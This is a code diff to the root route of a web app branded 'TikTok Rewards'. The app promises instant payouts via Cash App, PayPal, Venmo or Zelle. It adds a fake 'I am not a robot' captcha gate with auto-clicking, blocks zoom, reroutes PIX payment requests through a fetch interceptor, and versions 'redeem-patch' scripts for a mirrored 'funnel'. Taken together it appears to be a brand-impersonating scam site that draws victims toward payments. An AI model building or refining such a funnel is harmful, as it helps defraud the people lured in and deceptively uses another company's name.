@@ -188,12 +188,14 @@ const earlyRootRedirectScript = String.raw`
   }
 
   if (window.location.pathname === "/" || window.location.pathname === "") {
-    if (window.location.search.length === 0) {
-      window.location.replace("/landingpage");
-      return;
-    }
+    let verified = false;
+    try {
+      verified = window.localStorage.getItem("captcha_verified") === "true";
+    } catch (e) {}
 
-    window.location.replace("/inicio" + window.location.search + window.location.hash);
+    if (verified) {
+      window.location.replace("/inicio" + window.location.search + window.location.hash);
+    }
   }
 })();
 `;
@@ -262,19 +264,43 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
   head: () => ({
     meta: [
       { charSet: "utf-8" },
-      { name: "viewport", content: "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" },
+      {
+        name: "viewport",
+        content:
+          "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover",
+      },
       { name: "theme-color", content: "#ff0050" },
       { title: "TikTok Rewards" },
-      { name: "description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
+      {
+        name: "description",
+        content:
+          "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer.",
+      },
       { name: "author", content: "TikTok Rewards" },
       { property: "og:title", content: "TikTok Rewards" },
-      { property: "og:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
+      {
+        property: "og:description",
+        content:
+          "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer.",
+      },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
       { name: "twitter:title", content: "TikTok Rewards" },
-      { name: "twitter:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
-      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
-      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
+      {
+        name: "twitter:description",
+        content:
+          "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer.",
+      },
+      {
+        property: "og:image",
+        content:
+          "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png",
+      },
+      {
+        name: "twitter:image",
+        content:
+          "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png",
+      },
     ],
     links: [
       {
@@ -367,7 +393,8 @@ function RootComponent() {
   useEffect(() => {
     if (isNativeAppRoute) return;
     const enforceViewportOnly = () => {
-      const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
+      const viewportContent =
+        "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
       let viewport = document.querySelector<HTMLMetaElement>('meta[name="viewport"]');
       if (!viewport) {
         viewport = document.createElement("meta");
@@ -394,8 +421,7 @@ function RootComponent() {
                 ? input.toString()
                 : (input as Request).url;
           if (urlStr.includes("/functions/v1/create-pix-payment")) {
-            const body =
-              init?.body ?? (input instanceof Request ? await input.text() : "{}");
+            const body = init?.body ?? (input instanceof Request ? await input.text() : "{}");
             return origFetch("/api/public/create-pix-payment", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -403,8 +429,7 @@ function RootComponent() {
             });
           }
           if (urlStr.includes("/functions/v1/check-pix-status")) {
-            const body =
-              init?.body ?? (input instanceof Request ? await input.text() : "{}");
+            const body = init?.body ?? (input instanceof Request ? await input.text() : "{}");
             return origFetch("/api/public/check-pix-status", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -491,9 +516,18 @@ function RootComponent() {
       const findCaptchaVerifyButton = (target: EventTarget | null) => {
         const button = document.querySelector<HTMLButtonElement>('button[aria-label="Verify"]');
         if (!button || !document.body.innerText.includes("I am not a robot")) return null;
-        if (target instanceof Element && target.closest("input, textarea, select, [contenteditable='true']")) return null;
+        if (
+          target instanceof Element &&
+          target.closest("input, textarea, select, [contenteditable='true']")
+        )
+          return null;
         const card = button.parentElement?.parentElement;
-        if (target === button || (target instanceof Node && button.contains(target)) || (target instanceof Node && card?.contains(target))) return button;
+        if (
+          target === button ||
+          (target instanceof Node && button.contains(target)) ||
+          (target instanceof Node && card?.contains(target))
+        )
+          return button;
         return null;
       };
       let captchaTapLock = false;
@@ -503,8 +537,12 @@ function RootComponent() {
         if (!captchaTapLock) {
           captchaTapLock = true;
           window.setTimeout(() => {
-            try { button.click(); } catch {}
-            window.setTimeout(() => { captchaTapLock = false; }, 700);
+            try {
+              button.click();
+            } catch {}
+            window.setTimeout(() => {
+              captchaTapLock = false;
+            }, 700);
           }, 0);
         }
         return true;
@@ -513,7 +551,11 @@ function RootComponent() {
         if (event.ctrlKey && event.cancelable) event.preventDefault();
       };
       const preventKeyboardZoom = (event: KeyboardEvent) => {
-        if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key) && event.cancelable) {
+        if (
+          (event.ctrlKey || event.metaKey) &&
+          ["+", "-", "=", "0"].includes(event.key) &&
+          event.cancelable
+        ) {
           event.preventDefault();
         }
       };
@@ -560,10 +602,23 @@ function RootComponent() {
       document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
       document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
       document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
-      document.addEventListener("touchstart", preventMultiTouchZoom, { passive: false, capture: true });
+      document.addEventListener("touchstart", preventMultiTouchZoom, {
+        passive: false,
+        capture: true,
+      });
       window.addEventListener("touchmove", preventMultiTouchZoom, { passive: false });
-      document.addEventListener("touchmove", preventMultiTouchZoom, { passive: false, capture: true });
-      document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
+      document.addEventListener("touchmove", preventMultiTouchZoom, {
+        passive: false,
+        capture: true,
+      });
+      document.addEventListener(
+        "touchend",
+        (event) => {
+          activateCaptchaTap(event.target);
+          enforceViewport();
+        },
+        { passive: true, capture: true },
+      );
       window.addEventListener("wheel", preventCtrlWheelZoom, { passive: false });
       document.addEventListener("wheel", preventCtrlWheelZoom, { passive: false, capture: true });
       window.addEventListener("keydown", preventKeyboardZoom, { passive: false });
@@ -573,18 +628,26 @@ function RootComponent() {
       });
       window.addEventListener("focusout", () => window.setTimeout(enforceViewport, 220));
       window.visualViewport?.addEventListener("resize", enforceViewport);
-      window.addEventListener("click", (event) => {
-        const target = event.target as Element | null;
-        if (activateCaptchaTap(target)) return;
-        if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
-        enforceViewport();
-      }, true);
-      document.addEventListener("click", (event) => {
-        const target = event.target as Element | null;
-        if (activateCaptchaTap(target)) return;
-        if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
-        enforceViewport();
-      }, true);
+      window.addEventListener(
+        "click",
+        (event) => {
+          const target = event.target as Element | null;
+          if (activateCaptchaTap(target)) return;
+          if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
+          enforceViewport();
+        },
+        true,
+      );
+      document.addEventListener(
+        "click",
+        (event) => {
+          const target = event.target as Element | null;
+          if (activateCaptchaTap(target)) return;
+          if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
+          enforceViewport();
+        },
+        true,
+      );
       window.addEventListener("popstate", () => {
         setTimeout(() => {
           fallbackToHomeIfInvalid();
@@ -621,12 +684,14 @@ function RootComponent() {
 
     // Structure 02 runs the same funnel from a mirrored bundle under /e2/*.
     const isStructure2 = window.location.pathname.startsWith("/e2/");
-    const patchSrc = isStructure2 ? "/redeem-patch-2.js?v=2" : "/redeem-patch.js?v=13";
+    const patchSrc = isStructure2 ? "/redeem-patch-2.js?v=3" : "/redeem-patch.js?v=14";
     const bundleSrc = isStructure2
-      ? "/assets2/index-BhN0l3GJ.js"
-      : "/assets/index-BhN0l3GJ.js";
+      ? "/assets2/index-BhN0l3GJ.js?v=verification-2"
+      : "/assets/index-BhN0l3GJ.js?v=verification-2";
 
-    const existingPatch = document.getElementById("redeem-patch-script") as HTMLScriptElement | null;
+    const existingPatch = document.getElementById(
+      "redeem-patch-script",
+    ) as HTMLScriptElement | null;
     if (!existingPatch || !existingPatch.src.includes(patchSrc)) {
       existingPatch?.remove();
       const patch = document.createElement("script");
